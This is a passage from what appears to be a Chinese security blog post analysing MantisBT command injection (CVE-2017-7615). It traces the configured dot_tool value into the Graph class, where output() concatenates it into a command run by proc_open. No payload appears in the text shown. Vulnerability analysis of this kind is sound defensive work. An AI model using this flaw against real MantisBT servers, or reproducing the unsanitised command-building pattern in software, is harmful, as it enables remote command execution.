<span class="x">        if( workflow_transition_edge_exists( $t_from_status, $t_to_status_id ) ) {</span>
<span class="x">            $t_graph-&gt;add_edge( string_no_break( MantisEnum::getLabel( lang_get( 'status_enum_string' ), $t_from_status ) ),</span>
<span class="x">                                string_no_break( MantisEnum::getLabel( lang_get( 'status_enum_string' ), $t_to_status_id ) ),</span>
<span class="x">                                array() );</span>
<span class="x">        }</span>
<span class="x">    }</span>
<span class="x">}</span>

<span class="x">$t_graph-&gt;output( 'png', true );</span>
</pre></div>
<p>会从配置中取出我们设置好的dot_tool值，然后作为参数实例化一个Graph对象，最终会调用Graph的output方法</p>
<p>查看Graph的构造函数</p>
<div class="highlight"><pre><span></span><span class="x">function __construct( $p_name = 'G', array $p_attributes = array(), $p_tool = 'neato' ) {</span>
<span class="x">        if( is_string( $p_name ) ) {</span>
<span class="x">            $this-&gt;name = $p_name;</span>
<span class="x">        }</span>

<span class="x">        $this-&gt;set_attributes( $p_attributes );</span>

<span class="x">        $this-&gt;graphviz_tool = $p_tool;</span>
<span class="x">    }</span>
</pre></div>
<p>会将参数dot_tool的值赋给graphviz_tool</p>
<p>进而在Graph类的output函数中</p>
<div class="highlight"><pre><span></span><span class="x">function output( $p_format = 'dot', $p_headers = false ) {</span>
<span class="x">......</span>
<span class="x">        $t_command = $this-&gt;graphviz_tool . ' -T' . $p_format;</span>
<span class="x">        $t_descriptors = array(</span>
<span class="x">            0 =&gt; array( 'pipe', 'r', ),</span>
<span class="x">            1 =&gt; array( 'pipe', 'w', ),</span>
<span class="x">            2 =&gt; array( 'file', 'php://stderr', 'w', ),</span>
<span class="x">            );</span>

<span class="x">        $t_pipes = array();</span>
<span class="x">        $t_proccess = proc_open( $t_command, $t_descriptors, $t_pipes );</span>
<span class="x">......</span>
<span class="x">}</span>
</pre></div>
<p>会将graphviz_tool参数拼接到命令中执行proc_popen，进而导致命令注入</p>
<h2 data-content="1" id="06e78450bf02d118b1937bc1d90d364f">参考</h2>
<p>[1] <a href="https://1s1and123.github.io/" target="_blank">1s1and's blog</a></p>
<p>[2] <a href="https://bugtraq.securityfocus.com/detail/201704181234.v3ICYCab032033" target="_blank">CVE-2017-7615</a></p>
</div>
</div>